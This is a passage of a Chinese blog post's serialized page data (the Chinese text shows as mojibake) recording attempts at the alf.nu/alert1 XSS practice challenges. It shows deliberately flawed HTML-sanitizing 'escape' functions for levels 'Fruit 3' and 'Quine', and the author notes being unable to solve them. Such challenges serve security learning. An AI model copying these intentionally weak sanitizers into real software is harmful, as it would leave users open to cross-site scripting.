language-js\",\"children\":[[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"function\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"escape\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-params\",\"children\":\"s\"}],\") {\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"var\"}],\" div = \",[\"$\",\"span\",null,{\"className\":\"hljs-variable language_\",\"children\":\"document\"}],\".\",[\"$\",\"span\",null,{\"className\":\"hljs-property\",\"children\":\"implementation\"}],\".\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"createHTMLDocument\"}],\"().\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"createElement\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'div'\"}],\");\\n  div.\",[\"$\",\"span\",null,{\"className\":\"hljs-property\",\"children\":\"innerHTML\"}],\" = s;\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"function\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"f\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-params\",\"children\":\"n\"}],\") {\\n    \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"if\"}],\" (\",[\"$\",\"span\",null,{\"className\":\"hljs-regexp\",\"children\":\"/script/i\"}],\".\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"test\"}],\"(n.\",[\"$\",\"span\",null,{\"className\":\"hljs-property\",\"children\":\"tagName\"}],\")) n.\",[\"$\",\"span\",null,{\"className\":\"hljs-property\",\"children\":\"parentNode\"}],\".\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"removeChild\"}],\"(n);\\n    \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"for\"}],\" (\",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"var\"}],\" i=\",[\"$\",\"span\",null,{\"className\":\"hljs-number\",\"children\":\"0\"}],\"; i\u003cn.\",[\"$\",\"span\",null,{\"className\":\"hljs-property\",\"children\":\"attributes\"}],\".\",[\"$\",\"span\",null,{\"className\":\"hljs-property\",\"children\":\"length\"}],\"; i++) {\\n      \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"var\"}],\" name = n.\",[\"$\",\"span\",null,{\"className\":\"hljs-property\",\"children\":\"attributes\"}],\"[i].\",[\"$\",\"span\",null,{\"className\":\"hljs-property\",\"children\":\"name\"}],\";\\n      \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"if\"}],\" (name !== \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'class'\"}],\") { n.\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"removeAttribute\"}],\"(name); }\\n    }\\n  }\\n  [].\",[\"$\",\"span\",null,{\"className\":\"hljs-property\",\"children\":\"map\"}],\".\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"call\"}],\"(div.\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"querySelectorAll\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'*'\"}],\"), f);\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"return\"}],\" div.\",[\"$\",\"span\",null,{\"className\":\"hljs-property\",\"children\":\"innerHTML\"}],\";\\n}\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"è¿™ä¸€é¢˜æ”¹å˜äº†ç¬¬äº”è¡Œçš„ifè¯­å¥ï¼Œçœ‹ä¸å‡ºæ¥ä¼šå¸¦æ¥ä»€ä¹ˆä¸åŒçš„å½±å“ã€‚\\nè‡³å°‘å¯¹äºæˆ‘ä¸Šä¸€é¢˜çš„è§£æ³•æ²¡å½±å“ï¼Œæ‰€ä»¥ç”¨åŒæ ·çš„æ–¹æ³•å°±å¯ä»¥ã€‚\"}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"h1\",null,{\"id\":\"fruit-3\",\"children\":\"Fruit 3\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"hljs language-js\",\"children\":[[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"function\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"escape\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-params\",\"children\":\"s\"}],\") {\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"var\"}],\" div = \",[\"$\",\"span\",null,{\"className\":\"hljs-variable language_\",\"children\":\"document\"}],\".\",[\"$\",\"span\",null,{\"className\":\"hljs-property\",\"children\":\"implementation\"}],\".\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"createHTMLDocument\"}],\"().\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"createElement\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'div'\"}],\");\\n  div.\",[\"$\",\"span\",null,{\"className\":\"hljs-property\",\"children\":\"innerHTML\"}],\" = s;\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"function\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"f\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-params\",\"children\":\"n\"}],\") {\\n    \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"if\"}],\" (\",[\"$\",\"span\",null,{\"className\":\"hljs-regexp\",\"children\":\"/script/i\"}],\".\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"test\"}],\"(n.\",[\"$\",\"span\",null,{\"className\":\"hljs-property\",\"children\":\"tagName\"}],\")) n.\",[\"$\",\"span\",null,{\"className\":\"hljs-property\",\"children\":\"parentNode\"}],\".\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"removeChild\"}],\"(n);\\n    \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"for\"}],\" (\",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"var\"}],\" i=\",[\"$\",\"span\",null,{\"className\":\"hljs-number\",\"children\":\"0\"}],\"; i\u003cn.\",[\"$\",\"span\",null,{\"className\":\"hljs-property\",\"children\":\"attributes\"}],\".\",[\"$\",\"span\",null,{\"className\":\"hljs-property\",\"children\":\"length\"}],\"; i++) {\\n      \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"var\"}],\" name = n.\",[\"$\",\"span\",null,{\"className\":\"hljs-property\",\"children\":\"attributes\"}],\"[i].\",[\"$\",\"span\",null,{\"className\":\"hljs-property\",\"children\":\"name\"}],\";\\n      \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"if\"}],\" (name !== \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'class'\"}],\") { n.\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"removeAttribute\"}],\"(name); i--; }\\n    }\\n  }\\n  [].\",[\"$\",\"span\",null,{\"className\":\"hljs-property\",\"children\":\"map\"}],\".\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"call\"}],\"(div.\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"querySelectorAll\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'*'\"}],\"), f);\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"return\"}],\" div.\",[\"$\",\"span\",null,{\"className\":\"hljs-property\",\"children\":\"innerHTML\"}],\";\\n}\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"ä¸ä¼šã€‚\"}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"h1\",null,{\"id\":\"quine\",\"children\":\"Quine\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"hljs language-js\",\"children\":[[\"$\",\"span\",null,{\"className\":\"hljs-comment\",\"children\":\"// submitted by Somebody\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"function\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"escape\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-params\",\"children\":\"s\"}],\") {\\n    \",[\"$\",\"span\",null,{\"className\":\"hljs-comment\",\"children\":\"// We've got a quine level in all of the other\"}],\"\\n    \",[\"$\",\"span\",null,{\"className\":\"hljs-comment\",\"children\":\"// games, so why not have one here?\"}],\"\\n    \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"var\"}],\" win = alert;\\n    \",[\"$\",\"span\",null,{\"className\":\"hljs-variable language_\",\"children\":\"window\"}],\".\",[\"$\",\"span\",null,{\"className\":\"hljs-property\",\"children\":\"alert\"}],\" = \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"function\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-params\",\"children\":\"t\"}],\") {\\n        \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"if\"}],\" (t === s)\\n            \",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"win\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-number\",\"children\":\"1\"}],\");\\n        \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"else\"}],\"\\n            \",[\"$\",\"span\",null,{\"className\":\"hljs-variable language_\",\"children\":\"console\"}],\".\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"log\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"Alert: \\\"\"}],\" + t + \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"\\\\n(That's not a quine)\\\"\"}],\");\\n    }\\n    \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"return\"}],\" s;\\n}\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"è¿™é¢˜å¾ˆæœ‰æ„æ€ã€‚å¯æƒœæˆ‘ä¸ä¼šå•Šã€‚\"}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"å‚è€ƒ\",[\"$\",\"a\",null,{\"href\":\"http://www.pwntester.com/blog/2014/01/06/escape-alf-nu-xss-challenges-write-ups-part-148/\",\"children\":\"åšå®¢-ä¸Š\"}]]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"å‚è€ƒ\",[\"$\",\"a\",null,{\"href\":\"http://www.pwntester.com/blog/2014/01/08/escape-alf-nu-xss-challenges-write-ups-part-257/\",\"children\":\"åšå®¢-ä¸‹\"}]]}]]}]]}]]\n"])</script><script>self.__next_f.push([1,"6:[[[\"$\",\"meta\",null,{\"charSet\":\"utf-8\"}],[\"$\",\"title\",null,{\"children\":\"XSSç»ƒä¹ :alf.nu/alert1 Write-ups\"}],null,null,null,null,null,null,null,null,null,[\"$\",\"meta\",null,{\"name\":\"viewport\",\"content\":\"width=device-width, initial-scale=1\"}],null,null,null,null,null,null,null,null,null,null,[]],[null,null,null,null],null,null,[null,null,null,null,null],null,null,null,null,[null,[[\"$\",\"link\",null,{\"rel\":\"icon\",\"href\":\"/favicon.ico\",\"type\":\"image/x-icon\",\"sizes\":\"any\"}]],[],null]]\n"])</script>